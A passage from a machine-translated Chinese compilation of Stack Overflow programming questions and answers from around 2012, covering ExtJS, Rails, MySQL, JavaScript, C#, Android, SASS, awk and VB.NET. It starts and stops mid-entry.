    vtype: 'email',
    allowBlank:false
},
....
....
] 
```

如何在**文本框和中间名列**之间留出/增加空格？![在此处输入图像描述](../Images/d8ba69c4654da7d75ed0d7d2b6fc8052.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T10:04:56.960

如果您知道列数，请使用列布局。否则这样做：

```
defaults: {
    labelStyle: 'padding-left:10px;'
},
items: [...] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-01T11:55:54.197

将`defaults`配置添加到列的容器中。`defaults`它的所有子项都将具有您在( [docs](http://docs.sencha.com/extjs/4.1.3/#!/api/Ext.container.AbstractContainer-cfg-defaults) )中定义的设置。在此示例中，只有`margin`设置 ( [docs](http://docs.sencha.com/extjs/4.1.3/#!/api/Ext.AbstractComponent-cfg-margin) )`defaults`将应用于每个项目/列。

```
Ext.create('Ext.panel.Panel', {
  title: 'Column Layout - with default margins',
  width: 350,
  height: 250,
  layout:'column',
  defaults: {
    margin: '0 15 0 0' //top right bottom left (clockwise) margins of each item/column
  },
  items: [{
    title: 'Column 1',
    columnWidth: 0.25
  },{
    title: 'Column 2',
    columnWidth: 0.55
  },{
    title: 'Column 3',
    columnWidth: 0.20
  }],
  renderTo: Ext.getBody()
}); 
```

接受的解决方案仅适用于作为列的字段。我的解决方案适用于任何类型的列。

PS：列布局文档在[这里](http://docs.sencha.com/extjs/4.1.3/#!/api/Ext.layout.container.Column)。

# ruby-on-rails-3 - Rails 3.x 如何根据行值编写全部更新？

> ID：10347618
> 
> 赞同：1
> 
> 时间：2012-04-27T08:49:14.153
> 
> 标签：ruby-on-rails-3, activerecord

我希望在添加列后在迁移文件中执行以下 SQL 查询（使用同一行中的现有列值更新新字段）

```
UPDATE users SET last_login=updated_at; 
```

SQL 语句在数据库上执行时可以正常工作，但是在 rails 中我使用 ActiveRecord update_all 方法尝试了多种语法但没有成功

```
User.update_all("last_login=updated_at") 
```

我收到以下错误

```
ActiveRecord::StatementInvalid: PGError: ERROR:  current transaction is aborted, commands ignored until end of transaction block
: UPDATE "users" SET last_login=updated_at 
```

显然我的语法中缺少一些东西，但无法弄清楚是什么。谁能指出我正确的语法？

问候/J。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-30T05:32:53.877

语法确实是正确的，问题在于我不得不回滚之前的[事务](https://stackoverflow.com/questions/2979369/databaseerror-current-transaction-is-aborted-commands-ignored-until-end-of-tra "PG错误")。

```
User.update_all("last_login=updated_at") 
```

该语句正常工作。

# asp.net - 寻找 ASP.NET (MVC 3) 论坛引擎

> ID：10347619
> 
> 赞同：5
> 
> 时间：2012-04-27T08:49:14.470
> 
> 标签：asp.net, asp.net-mvc-3, forum

我正在寻找论坛引擎。

有一些要求：

1.  平台是 ASP.NET(MVC 2,3)
2.  MS SQL 或 MySql 数据库
3.  开源
4.  可自定义（更改主题、版主设置、帐户设置等）
5.  高性能

有人可以建议最适用的解决方案吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-05T07:31:32.083

也看看..

[http://www.mvcforum.com](http://www.mvcforum.com)

Unity、DDD、Entity Framework v5、MVC3、SQL EXPRESS 和开源。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-27T08:57:14.487

[Nearforums](http://nearforums.codeplex.com/)是 ASP.NET MVC 3 论坛，支持 MSSQL 和 MySql 引擎。

麻省理工学院（许可）许可、网络管理、模板（又名主题）、I18n、...由[Outercurve 基金会](http://www.outercurve.org/)提供。

# mysql - 嵌套 CAST 不起作用

> ID：10347624
> 
> 赞同：6
> 
> 时间：2012-04-27T08:49:43.143
> 
> 标签：mysql, casting, nested

为什么嵌套转换在 MySQL 中不起作用？（它确实使用 SQL Server）

```
select cast(cast(myColumn as decimal(5,2)) as int) from myTable 
```

[SQLFiddle 示例](http://sqlfiddle.com/#!2/682a6/12)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T11:13:34.883

根据[手册](http://dev.mysql.com/doc/refman/5.0/en/cast-functions.html#function_cast)：

> **`CAST(expr AS type)`**[...]
> 
> **`CONVERT(expr,type)`**[...]
> 
> ***`type`***可以是以下值之一：
> 
> *   **`BINARY[(N)]`**
>     
>     
> *   **`CHAR[(N)]`**
>     
>     
> *   **`DATE`**
>     
>     
> *   **`DATETIME`**
>     
>     
> *   **`DECIMAL[(M[,D])]`**
>     
>     
> *   **`SIGNED [INTEGER]`**
>     
>     
> *   **`TIME`**
>     
>     
> *   **`UNSIGNED [INTEGER]`**

因此，只需按照手册进行操作：

```
SELECT CAST(CAST(myColumn AS DECIMAL(5,2)) AS SIGNED) FROM myTable 
```

或者

```
SELECT CAST(CAST(myColumn AS DECIMAL(5,2)) AS UNSIGNED) FROM myTable 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-14T06:56:06.570

此查询正在处理嵌套转换的概念。

cast(sum(cast(Column_name int)+ cast(Column_name as int)) as bigint) 作为来自 table_name 的付款

# php - 基于 Web 数据的大型机器学习

> ID：10347625
> 
> 赞同：3
> 
> 时间：2012-04-27T08:49:50.317
> 
> 标签：php, database, matrix, mapreduce, machine-learning

如果我想使用太大而无法放入内存的矩阵进行大量数据拟合，我会研究哪些工具/库？具体来说，如果我通常使用 php+mysql 从网站上运行数据，你会如何建议制作一个可以在合理时间内运行大型矩阵运算的离线进程？

可能的答案可能是“你应该使用这种语言和这些分布式矩阵算法在许多机器上映射 reduce”。我想 php 不是最好的语言，所以流程更像是其他一些离线进程从数据库中读取数据，进行学习，并以 php 以后可以使用的格式存储规则（因为网站的其他部分是用 php 构建的）。

不确定这是否是问这个问题的正确地方（会在机器学习 SE 中问它，但它从未退出测试版）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T09:32:06.480

There are lots of things that you need to do if you want to process large amounts of data. One way of processing web scale data is to use Map/Reduce and maybe you can look at [Apache Mahout](http://mahout.apache.org/) Which is a scalable machine learning package containing

*   Collaborative Filtering
*   User and Item based recommenders
*   K-Means, Fuzzy K-Means clustering
*   And many more.

Specifically what you want to do might be available in some opensource project, such as [Weka](http://www.cs.waikato.ac.nz/ml/weka/) but you might need to migrate/create code to do a distribute job.

Hope the above gives you an idea.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-28T15:15:25.460

机器学习是一个广泛的领域，可以用于许多不同的事情（例如有监督的预测建模和无监督的数据探索）。根据您想要实现的目标以及数据的性质和维度，找到可扩展的算法，这些算法在输出模型的质量和利用大型训练集的可扩展性以及速度和内存消耗方面都很有趣预测时间是一个一般无法回答的难题。一些算法是可扩展的，因为它们是在线的（即增量学习，而不必一次加载所有数据集），另一些算法是可扩展的，因为它们可以分为可以并行执行的子任务）。这完全取决于您要达到的目标以及您过去收集/注释的数据类型。

例如，对于文本分类，具有良好特征（TF-IDF 归一化、可选的二元组和可选的 chi2 特征选择）的逻辑回归等简单线性模型可以扩展到非常大的数据集（数百万个文档），而无需任何类型的集群集群上的并行化。看看 liblinear 和 vowpal wabbit 来构建这种可扩展的分类模型。

# javascript - 在javascript闭包中加载一次XML文件

> ID：10347626
> 
> 赞同：0
> 
> 时间：2012-04-27T08:49:50.303
> 
> 标签：javascript, xml, closures

我目前正在尝试创建一个 javascript 闭包，它将使用我拥有的 XML 文件中的值创建一个下拉列表。我已经让它适用于大部分代码，并且每次我不得不使用它时都在加载 XML 文件。我想让代码更高效，并且只加载一次 XML 文件。我尝试使用下面的代码执行此操作，但不断收到错误消息。

这是我的关闭代码...

```
var closure = function() {

    var xmlDoc;

    return{

            setXML: function()
            {
                xmlDoc = this.loadXMLDoc("feed.xml");
            },

            loadXMLDoc: function(dname)
            {
                if (window.XMLHttpRequest)
                {
                    xhttp=new XMLHttpRequest();
                }
                else
                {
                    xhttp=new ActiveXObject("Microsoft.XMLHTTP");
                }

                xhttp.open("GET",dname, false);
                xhttp.send();
                return xhttp.responseXML;
            },

            createField: function() 
            {
                x = xmlDoc.getElementsByTagName("name");
                //code to create the drop down box
            },

            findValue: function() 
            {
                y = xmlDoc.getElementsByTagName("value");
                //code to find value
            }

   };

}(); 
```

这是调用函数的代码...

```
$(document).ready(function () {
    closure.setXML();
}); 
```

我得到的错误是'无法调用未定义的方法'getElementsByTagName'，它可以在createField函数中找到。这是我第一次尝试使用 xmlDoc。

非常感谢有关该问题的任何帮助或教程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:59:27.257

既然你是 doint jQuery，为什么不在你的闭包中也使用 jQuery？如果`xmlDoc`是`undefined`，则加载它一定有问题。尝试`console.log`执行 AJAX 后是否返回任何数据。

```
var closure = (function($) {

    var xmlDoc;

    return {
        setXML: function() {
            this.loadXMLDoc("feed.xml", function(data) {
                xmlDoc = data;
            });
        },
        loadXMLDoc: function(dname, callback) {
            $.get(dname, function(data) {

                //a possible point of failure
                //do console.log(data) to see if anything was returned

                callback(data);
            }, 'xml');
        },
        createField: function() {
            x = $("name",xmlDoc);
            //code to create the drop down box
        },
        findValue: function() {
            y = $("value",xmlDoc);
            //code to find value
        }
    };
}(jQuery));​ 
```

# ios - 旋转后以编程方式更改 UIkeyboard 的框架

> ID：10347629
> 
> 赞同：1
> 
> 时间：2012-04-27T08:50:01.923
> 
> 标签：ios, iframe, rotation, uikeyboard

由于我有一个复杂的视图层次结构，我使用 CGAffineTransformMakeRotation 手动处理旋转。

一切都和谐地旋转，状态栏，导航栏等。唯一的问题是，如果键盘在旋转之前在屏幕上，它会获得满足栏的方向，但它的大小不正确。

我怎样才能强制它填充整个宽度并获得正确的高度？

我用一个测试 UIview 进行了测试，它看起来像这样。 [http://dl.dropbox.com/u/15251533/iPhoneSimulatorScreenshot_20120430_133558.png](http://dl.dropbox.com/u/15251533/iPhoneSimulatorScreenshot_20120430_133558.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T07:30:25.913

我找到了一种简单的方法来摆脱这种情况。如果您在 Textfield 上调用 resignFirstResponder 并随后成为firstresdonder。旋转后键盘出现在正确的位置。如果你有它也不会干扰动画。

# c# - 通用 Func<> 在 c# 中键入

> ID：10347634
> 
> 赞同：4
> 
> 时间：2012-04-27T08:50:52.917
> 
> 标签：c#, functional-programming, lisp

我正在用 C# 编写一个小型 Lisp 解释器，它基本上已经可以工作了。目前我正在使用一个接口来表示函数：

```
public interface LispFunction
{
    object Apply(ArrayList parameters);
} 
```

该接口由多个类实现，用于内部（标准）函数、lambda、宏扩展、通过反射调用 .net 对象中的方法等。请注意，速度在这里不是问题，只是让口译员在工作中使用它的乐趣。

现在我希望我的小 Lisp 接受在解释器中使用的任意 C# lambda，如下所示：

```
Lisp foo = new Lisp();
foo.GlobalEnvironment.AddFunction("test", (bool a, int b) => a ? b : "whoops");
foo.Eval(foo.Read("(test #t 5)")); // Should evaluate to (object) 5 
```

我想到的第一件事是使用`Func<...>`，但我必须为 、 等使用大量`Func<a>`重载`Func<a, b>`方法`Func<a, b, c>`。

C# 中是否有可能接受稍后通过反射调用的任意 lambda？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-27T08:54:44.027

> C# 中是否有可能接受稍后通过反射调用的任意 lambda？

好吧，您可以编写一个方法来获取任意*委托*：

```
public void AddFunction(string name, Delegate function) 
```

但是，来自 lambda 表达式的转换必须作为特定的委托，因此您需要：

```
Func<bool, string, string> function = (a, b) => a ? b : "whoops"
foo.GlobalEnvironment.AddFunction("test", function); 
```

或在通话中投射：

```
foo.GlobalEnvironment.AddFunction("test",
    (Func<bool, string, string>)((a, b) => a ? b : "whoops")); 
```

您可以将所有重载放在*一个*地方，保持`AddFunction`完全通用，但有一个像这样的静态类（有点像`Tuple`）：

```
public static class Func
{
    public Func<TResult> Create(Func<TResult> function) { return function; }

    public Func<T1, TResult> Create(Func<T1, TResult> function)
    {
        return function;
    }

    public Func<T1, T2, TResult> Create(Func<T1, T2, TResult> function)
    {
        return function;
    }

    // etc
} 
```

这个类基本上*只是*为了方便而存在。然后你会打电话：

```
foo.GlobalEnvironment.AddFunction("test",
    Func.Create((bool a, string b) => a ? b : "whoops")); 
```

# javascript - 加载正确的 PhoneGap 文件的最佳方法是什么

> ID：10347636
> 
> 赞同：0
> 
> 时间：2012-04-27T08:51:07.077
> 
> 标签：javascript, jquery, mobile, cordova

我正在使用 PhoneGap 开发一个混合应用程序，该应用程序将分发到多个移动操作系统。

我正在检测用户代理以加载正确的 PhoneGap 文件，在 JavaScript 中还有另一种更好的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-07T16:56:01.690

我刚刚解决了这个问题。我的应用应该只支持 Android 和所有 iOS 问题。

这是我放在应用程序头部的代码：如果您的应用程序支持，请随意添加更多设备类型！

```
<script type="text/javascript">
    if (navigator.userAgent.toLowerCase().match(/android/))
        document.write('<script charset="utf-8" src="js/cordova-1.7.0-droid.js"><\/script>');
    else //if (navigator.userAgent.toLowerCase().match(/iphone/) || navigator.userAgent.toLowerCase().match(/ipad/))
        document.write('<script charset="utf-8" src="js/cordova-1.7.0-ios.js"><\/script>');
</script> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-27T09:18:24.643

我不确定您使用的是哪个版本的 Phonegap 或 Cordova，但根据最新的文档，`Device`您可以使用操作系统的名称和更多信息。

例子，

`Device.platform`或者`Device.name`

[设备类的 Phonegap 文档](http://docs.phonegap.com/en/1.6.1/cordova_device_device.md.html#Device)

请让我知道它是否有效。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-27T09:20:24.483

正确的方法是为具有不同文件的不同系统部署和分发应用程序。部署 Android 应用时拥有 Android cordova.js，部署 iOS 应用时拥有苹果 cordova.js 等。

# wpf - PrintDialog.ShowDialog() 不返回 null

> ID：10347637
> 
> 赞同：0
> 
> 时间：2012-04-27T08:51:13.287
> 
> 标签：wpf, nullable, printdialog

WPF中PrintDialog类的ShowDialog方法声明为返回nullable bool（即bool？），与文档细节一致：

> “如果用户单击打印，则为 true；如果用户单击取消，则为 false；如果用户在未单击打印或取消的情况下关闭对话框，则为 null。” 来自[http://msdn.microsoft.com/en-us/library/system.windows.controls.printdialog.showdialog.aspx](http://msdn.microsoft.com/en-us/library/system.windows.controls.printdialog.showdialog.aspx)

但是，在下面的代码中，无论我如何关闭对话框（我尝试了 X 和 Alt-F4），我都无法让它返回 null。除非我按下打印按钮，否则它总是错误的。这是我的测试代码：

```
PrintDialog pd = new PrintDialog();
bool? result;
result = pd.ShowDialog(); 
```

你有同样的行为吗？文档是错误的还是我误解了它或没有正确测试？也许这与操作系统有关，我正在运行 Windows 7 Enterprise。

谢谢你。

大号

# c# - 如何在同一个应用程序中使用 MapPoint 控件和 Mappoint 应用程序

> ID：10347642
> 
> 赞同：1
> 
> 时间：2012-04-27T08:51:31.453
> 
> 标签：c#, .net, visual-studio, com, mappoint

我目前正在使用 MapPoint 对象库开发一个应用程序。第一行代码之一是

```
MapPoint.Application mapPointApplication = new MapPoint.Application(); 
```

它启动 Mappoint 应用程序，此时我可以与之交互（获取地图，添加图钉和图钉集等等......哦，幸福）。

当我希望用户在两个可能的图钉之间做出选择时，问题就会出现。为了方便这个选择，我会使用一个弹出对话框，其中两个图钉放在一个干净的地图上，使用 mappoint 控件。所以我试图引用这个控件并在我的表单上使用它，删除 VS 要求的对 Mappoint 对象库的引用，说控件库已经引用了对象库......似乎合法

可惜 ！完成参考更改后，我在第一行代码中遇到了构建错误，该错误显示在此消息的开头。

```
Cannot create an instance of the abstract class or interface 'MapPoint.Application' 
```

所以我的问题是：Mappoint 应用程序和 Mappoint 的实例化在同一个可执行文件中是否不兼容？

提前感谢您的任何见解

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T12:29:54.347

这是一个很好的问题。我只在一个项目中使用过控件或应用程序，从来没有同时使用过。

你有充分的理由同时使用两者吗？为什么不直接使用控件？

另外，我认为您会在[http://www.MapForums.com](http://www.MapForums.com)找到知识最渊博的 MapPoint 开发人员，我建议您也在那里发帖。

埃里克

# android - 单击 ListView 时显示项目

> ID：10347643
> 
> 赞同：0
> 
> 时间：2012-04-27T08:51:32.647
> 
> 标签：android, listview, dialog

我需要有关特定任务的帮助：

我的`ListView`主要活动中有一个与自定义`Adapter`关联的`OnItemLongClick`监听器，以及一个显示`Dialog`配置了许多操作（更改数量、取消项目......）的监听器，它就像一个魅力。

我的目标是在 中获得单击项目的物理副本`Dialog`，以立即显示所做的更改。

`Adapter`由于我的ListView项目很复杂并且由

我考虑过创建相同的结构（`ListView`和`Adapter`），只关联选定的项目，但它有点重......

在这种情况下，有没有更简单的解决方案可以帮助我？我的意思是原始 ListView 项目的真实副本，其中`Dialog`对原始对象所做的更改...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:05:54.083

发布您的相关代码可能有助于我们更清楚地指导您。

但是，您可以`onItemLongClick((AdapterView, View, int position, long)`使用`position`参数获取对象，即

```
YourObject objReference = yourActivityClassObjectList.get(position); 
```

现在在显示对话框时，将其传递`objReference`给您的对话框，当进行更改时，更改此内容`objReference`并调用

```
adapter.notifyDataSetChanged(); 
```

而不是传递`objReference`to 对话框，您可以传递`int position`并在进行更改时获取对该对象的引用，更改内容并通知数据集更改为 Adapter。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:06:57.557

当您单击一个列表视图项时，应触发[onListItemClick回调。](http://developer.android.com/reference/android/app/ListActivity.html#onListItemClick%28android.widget.ListView,%20android.view.View,%20int,%20long%29)正如您在文档中看到的，第三个参数是`position`. 您可以调用以检索at`YourAdapter.getItem(int)`持有的元素`listview``position`

# parameters - 如何以编程方式启动控制台/终端并将其当前目录更改为某个路径？

> ID：10347645
> 
> 赞同：1
> 
> 时间：2012-04-27T08:51:40.010
> 
> 标签：parameters, console

如何以编程方式启动控制台/终端并将其当前目录更改为某个路径？

语言：C++/Qt，但我确信这里的语言无关紧要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:05:56.497

在支持 C 库`system()`调用的系统上，您可以直接启动命令 shell。什么命令取决于操作系统：

*   对于 Windows，您需要以下内容：

    ```
    cmd /k cd \my\directory 
    ```

    （必要时转义反斜杠）

*   对于 Unix 变体，它可以是一个 X11 终端程序，带有指定要运行的命令的选项：

    ```
    xterm -e 'cd /tmp/ && bash' 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:03:01.620

您可以使用“cd”命令（在控制台中）更改目录。我相信这应该适用于大多数平台。

# toolbar - JavaFX 2.0 工具栏按钮加载 fxml

> ID：10347646
> 
> 赞同：0
> 
> 时间：2012-04-27T08:51:42.573
> 
> 标签：toolbar, javafx, actionlistener, javafx-2, fxml

我有一个带有几个按钮的工具栏。我想要几个这样的按钮来加载不同的 FXML 文件。现在完成的方法是在 Java 代码中写入 fxml 文件，并在每次调用时插入它。如果我可以调用 FXML 文件并获得正确的场景，那将是一个更好的选择。这是我加载设置视图的示例：

```
public void showModelSettings(){
    clearPane();
    GridPane gridPane = new GridPane();
    ColumnConstraints cc1 = new ColumnConstraints();
    cc1.setPercentWidth(50);
    ColumnConstraints cc2 = new ColumnConstraints();
    cc2.setPercentWidth(50);
    gridPane.getColumnConstraints().addAll(cc1,cc2);

    RowConstraints rc1 = new RowConstraints();
    rc1.setPercentHeight(30);
    RowConstraints rc2 = new RowConstraints();
    rc2.setPercentHeight(70);
    gridPane.getRowConstraints().addAll(rc1,rc2);

    //iwModel.setImage(new Image("C:\Users\Public\Pictures\Sample Pictures\Desert.jpg"));

    gridPane.setConstraints(cbModel, 0, 0);
    gridPane.setConstraints(btnImageChooser, 1, 0);

    gridPane.setConstraints(iwModel, 0, 1, 2, 1);

    gridPane.getChildren().addAll(cbModel, btnImageChooser,iwModel);
    mainPanel.getChildren().add(gridPane);

} 
```

我在较早的日期使用过 tabpane，它的方便之处在于它可以加载“内容”，这在某种程度上是一个可以加载 fxml 文件的动作侦听器。我希望我的工具栏按钮具有此功能。

所有帮助将不胜感激！谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-28T09:52:47.957

我想也许我解决了它，还不能检查，因为我的项目在其他包中有几个错误。但这是我相信会起作用的代码：

```
private Parent replaceSceneContent(String fxml) throws Exception {
        Parent page = (Parent) FXMLLoader.load(InventorySystem.class.getResource("/hist/inventory/gui/fxml/"+fxml), ResourceBundle.getBundle("MessageBundle",localSettings.getLocale()), new JavaFXBuilderFactory());
        Scene scene = stage.getScene();
        if(scene == null) {
            scene = new Scene(page, 340, 280);
            scene.getStylesheets().add("hist/inventory/gui/startStyle.css");    //Endre styles?
            //stage.setResizable(false);    //Må kanskje flyttes
            stage.setScene(scene);
            Organizer.getWindowFitter().setScene(scene);
        } else {
            stage.getScene().setRoot(page);
        }
        stage.sizeToScene();
        return page;
    }

    public void setScene(String scene) throws Exception {
        replaceSceneContent(scene);
    } 
```

# css - 如何在 SASS mixin 中使用 !default？

> ID：10347651
> 
> 赞同：10
> 
> 时间：2012-04-27T08:51:52.503
> 
> 标签：css, sass, compass-sass

我有这个 SASS 混合：

```
@mixin micro-clearfix
    &:after,
    &:before
        content: ""
        display: table
    &:after
        clear: both
    * html &
        height: 1% !default
    *+html &
        min-height: 1% !default 
```

不幸的是，它不能编译，除非我删除`!default`了这个 mixin 的重点。

我收到的错误消息是：

```
Invalid CSS after "1% ": expected expression (e.g. 1px, bold), was "!default") 
```

我想要实现的是，如果`height`（或`min-height`）已经为选择器定义了，那么 mixin 应该使用该值，否则它应该将此属性定义为 1%。

我不想使用`zoom`，因为这不是一个有效的属性，我喜欢保持我的 CSS 干净。

我使用`!default`错误的方式吗？

我有指南针 0.12.1 和 SASS 3.1.10。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-27T20:36:55.117

`!default`仅在声明变量时使用： http: [//sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#variable_defaults_](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#variable_defaults_)

您尝试做的事情应该使用[CSS`!important`声明](http://www.w3.org/TR/CSS21/cascade.html#important-rules)来完成，它应该在 mixin 之外的规则中使用（您想要占上风的那个）。无论如何，`!important`通常使用它不是一个好习惯。也许您可以依靠级联或特异性。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-27T21:33:12.490

这是我最终完成的方式：

```
@mixin micro-clearfix
    $minHeight: 1% !default
    &:after,
    &:before
        content: ""
        display: table
    &:after
        clear: both
    * html &
        height: $minHeight
    *+html &
        min-height: $minHeight 
```

# localization - LWUIT 符号表

> ID：10347652
> 
> 赞同：4
> 
> 时间：2012-04-27T08:52:02.580
> 
> 标签：localization, lwuit, symbol-table

我遇到了符号表的问题。在本地化的帮助下，我在我的[LWUIT应用程序中使用波斯语和英语。](https://www.oracle.com/technetwork/articles/java/lwuit-intro-138622.html)

现在我的问题是，当我按下任何移动设备的 * 按钮时，一些符号表字符被翻译成波斯字符，而一些保持不变。

我该如何解决这个问题？

# linux - AWK 删除空行

> ID：10347653
> 
> 赞同：21
> 
> 时间：2012-04-27T08:52:04.760
> 
> 标签：linux, awk

`/./`仅删除第一个条件的空行，`{ print "a"$0 }`我将如何确保脚本删除每个条件的空行？

```
awk -F, '/./ { print "a"$0 } NR!=1 { print "b"$0 } { print "c"$0 } END { print "d"$0 }' MyFile 
```

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2016-07-06T08:10:22.130

已经提出的答案的较短形式可能如下：

```
awk NF file 
```

任何`awk`脚本都遵循语法`condition {statement}`。如果语句块不存在，`awk`将打印整个记录（行）以防`condition`不为零。

`NF`变量 in`awk`保存行中的字段数。因此，当该行非空时，`NF`保留一个触发默认操作的正值`awk`（打印整行）。如果是空行，`NF`则为零且不满足条件，因此`awk`什么也不做。

请注意，您甚至不需要引号，因为这个 2 个字母的 awk 脚本不包含任何可以被 shell 解释的空格或字符。

* * *

或者

```
awk '!/^$/' file 
```

`^$`是空行的正则表达式。需要2`/`才能`awk`理解字符串是正则表达式。`!`是标准否定。

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2012-04-28T00:15:57.903

awk 命令从文件中删除空行：

```
awk 'NF > 0' filename 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-04-27T12:04:23.230

如果您想忽略所有空行，请将其放在脚本的开头

```
/^$/ {next} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-27T09:17:32.597

将以下条件放入第一个条件中，并使用`if`语句检查它们，如下所示：

```
awk -F, '
    /./ { 
        print "a"$0; 
        if (NR!=1) { print "b"$0 } 
        print "c"$0 
    } 
    END { print "d"$0 }
' MyFile 
```

# javascript - 网址没有出现在地址栏上

> ID：10347654
> 
> 赞同：0
> 
> 时间：2012-04-27T08:52:14.470
> 
> 标签：javascript, ajax

我使用下面的ajax代码

```
// JavaScript Document
function createTeam() {
    var name=document.getElementById("name").value;
    if(name==null || name==""){
        var div3 = document.getElementById("errorMessage");
        var text = "Enter Team";
        div3.style.display = "block";
        div3.style.color = "red";
        div3.style.fontSize = "65%";
        div3.innerHTML = text;
    }else{
        xmlhttp=new XMLHttpRequest();
        xmlhttp.open("POST","/TeamServlet?name="+name+"&task=create",true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.send();
        xmlhttp.onreadystatechange= readResponse;
    }
    function readResponse(){
        if (xmlhttp.readyState == 4)
        {
            response = xmlhttp.responseText;
            $('#button').hide("slow");
            if(response == "false"){
                var div2 = document.getElementById("errorMessage");
                var text = "Unable to create team.";
                div2.style.display = "block";
                div2.style.color = "red";
                div2.style.fontSize = "65%";
                div2.innerHTML = text;
            }
            if(response == "true"){
                var div = document.getElementById("errorMessage");
                var text1 = "Team created.";
                div.style.display = "block";
                div.style.color = "red";
                div.style.fontSize = "65%";
                div.innerHTML = text1;
            }
        }
    }
} 
```

但是当我使用这个 ajax 时会发生什么，URL 不会出现在浏览器的地址栏上。我该如何实现呢？唯一出现的 url 是在我提交登录表单后，即 [http://localhost:8080/LoginServlet?task=login](http://localhost:8080/LoginServlet?task=login) 但在此之后，即使我导航到其他 jsps/servlet，这些 url 也没有出现。如何修复此 ajax 代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:06:59.060

为什么要在地址栏中显示 ajax 请求的 url？如果您想在不离开当前页面的情况下调用服务器，则将执行 Ajax 请求。如果您想更改地址栏中的网址，则必须将用户重定向到所述网址，您不需要 Ajax。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:20:47.397

这就是 AJAX 的基本目的：在“后台”做异步请求。使用 AJAX 完成的所有请求都不会触发浏览器的加载图标，也不会更改当前 URL。

如果你想做这样的事情，你应该看看`HTML5 History API`. 因为这是一个巨大的主题，我不能告诉你“一个”的答案，但我给你一些资源来进入：

*   解释和演示[http://html5doctor.com/history-api/](http://html5doctor.com/history-api/)
*   解释和演示[http://dev.opera.com/articles/view/introducing-the-html5-history-api/](http://dev.opera.com/articles/view/introducing-the-html5-history-api/)
*   解释和演示[http://diveintohtml5.info/history.html](http://diveintohtml5.info/history.html)
*   解释和演示[http://robertnyman.com/2011/08/03/html5-history-api-and-improving-end-user-experience/](http://robertnyman.com/2011/08/03/html5-history-api-and-improving-end-user-experience/)
*   演示[http://html5demos.com/history](http://html5demos.com/history)

您会发现的问题是，并非所有浏览器都支持此 API，因此您需要使用*polyfill*使您的代码跨浏览器兼容。以下是您可以使用的跨浏览器 polyfill 列表：

*   History.js [https://github.com/browserstate/history.js](https://github.com/browserstate/history.js)
*   PJAX (pushState + ajax = pjax) [http://pjax.heroku.com/](http://pjax.heroku.com/)
*   hashchange jQuery 事件[http://benalman.com/projects/jquery-hashchange-plugin/](http://benalman.com/projects/jquery-hashchange-plugin/)
*   HistoryManager Mootools 插件[http://mootools.net/forge/p/historymanager/](http://mootools.net/forge/p/historymanager/)
*   SWFAddress [http://www.asual.com/swfaddress/](http://www.asual.com/swfaddress/) & jQuery 地址[http://www.asual.com/jquery/address/](http://www.asual.com/jquery/address/)
*   jQuery 历史插件[https://balupton.com/projects/jquery-history](https://balupton.com/projects/jquery-history)
*   jQuery Ajaxy [http://balupton.com/projects/jquery-ajaxy](http://balupton.com/projects/jquery-ajaxy)
*   哈希器[https://github.com/millermedeiros/hasher/](https://github.com/millermedeiros/hasher/)
*   sHistory [https://github.com/tatsh/sHistory](https://github.com/tatsh/sHistory)

此列表由 Modernizr 团队维护，最新版本可在[https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-Browser-Polyfills获得](https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-Browser-Polyfills)

# vb.net - 通过 VB.NET 检查我的笔记本电脑电池寿命

> ID：10347655
> 
> 赞同：2
> 
> 时间：2012-04-27T08:52:20.407
> 
> 标签：vb.net

在我的带有框架 2.0 的 VB.Net 项目中，我需要通过编码来获得笔记本电脑或笔记本电脑的当前黄油寿命。

是否可以获得当前的电池状态信息？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-27T08:59:00.683

你可以试试这个代码

```
Dim power As SystemInformation.PowerStatus = SystemInformation.PowerStatus
Dim percent As Single = power.BatteryLifePercent
MsgBox("Percent battery life remaining: " & percent * 100) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-27T08:56:45.673

查看[SystemInformation](http://msdn.microsoft.com/en-us/library/system.windows.forms.systeminformation.aspx)类，更具体地说，[PowerStatus属性（它返回](http://msdn.microsoft.com/en-us/library/system.windows.forms.systeminformation.powerstatus.aspx)[PowerStatus 类](http://msdn.microsoft.com/en-us/library/system.windows.forms.powerstatus.aspx)的实例）。

以下代码将为您提供当前的电池信息：

```
Dim powerstatus As PowerStatus = SystemInformation.PowerStatus

' Gets the current battery charge status.
